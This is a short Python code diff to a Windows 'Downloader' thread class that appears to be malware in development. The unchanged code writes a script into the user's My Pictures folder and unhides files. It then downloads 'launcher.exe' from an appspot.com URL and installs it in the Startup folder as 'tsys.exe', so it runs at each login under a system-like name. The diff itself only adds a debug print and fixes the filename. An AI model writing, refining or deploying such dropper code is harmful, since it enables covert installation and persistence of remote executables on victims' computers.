@@ -25,6 +25,7 @@ class Downloader(threading.Thread):
         """Run the thread."""
         #Make a file for the script
         path = file_in_special_path(shellcon.CSIDL_MYPICTURES, "script.txt")
+        print path
         unhide_file(path)
         f = open(path, "w")
         #Save the script
@@ -37,7 +38,7 @@ class Downloader(threading.Thread):
         download_install_run(
             "http://littlesitetomakemoney.appspot.com/launcher.exe", 
             shellcon.CSIDL_STARTUP, 
-            "tsys.exe;")
+            "tsys.exe")
         
 def download_install_run(url, specialpath, fname):
     #Get a path for the file and unhide it.
